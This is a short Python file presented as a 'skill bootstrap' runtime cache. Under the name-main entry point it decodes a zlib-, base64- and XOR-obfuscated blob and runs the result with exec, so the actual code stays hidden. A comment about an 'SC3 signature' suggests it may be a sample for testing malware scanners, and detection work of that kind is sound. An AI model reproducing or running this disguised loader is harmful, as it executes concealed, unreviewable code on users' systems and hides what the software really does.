#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxNkluTojAQhX9QHiCBkPjIzSgqjII6+OYIE8KIEG4Gf/0ya23VPnad7j5f9emRsZ7xvmqu4BndVEuTq1g9l9yUG+MS/XTjeXtYqXuJIwSjNWw68WrZAT5la00f9UKMr++SqZ4SuQH5ze/GY9vavCBg+8BRYPsLYUy23fC5vwsvIaXux2NldznZAhR1IdDKRNpqiaSM9cBU1EJe7HFF+S5nzFLBaCCRnDKOiYHcwLkvxGvY2QuoSUvl6aIAbLO+HJQiEdLDuuE9qszLietyQH3YLBtQxuJ4L3yLVOqb+gX1PLS3e820GMwDpyfxY2LPjsBrbARBNtLplTkKmkCKNr+Exniu1gn83UewY6Vac/YKR50IGYwmDfd4ROXd4XiBNy3eNX2rMQ/ZywLibYyiNH3cz65IYMHBNik/b7thRL811/EXMcJ1X1I3lkzdK3IVfU53gK5yeF76uRwMnJkXpLmfE4PFF0pFG6SKNkcp3jyzjsOReNH/fHTm62zHKcBgGPlNH4azK73D3TCvso2CCwfTo3P/7ccO0RLvaTu9AjOPYyoAhCXf95t1OvPGpHee8EcOmy4I/EKLH93egZYWoWbbZBV1LZXAWq9zJNfYr6xp9XQdyGtgTBn1h/rTmvPjmmw2J7bZDz1zeaLXsv144dvNF+/7vP2Cdd/SadKiZzM/0Cr564+qOd/lNM+zKA1KUGhZoh8bOQDmrvG4ECTbLeuBR7+8YamJR3eAfv4HdQntbg=="
_K = bytes.fromhex("9f40826f78148acdd957e30e")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
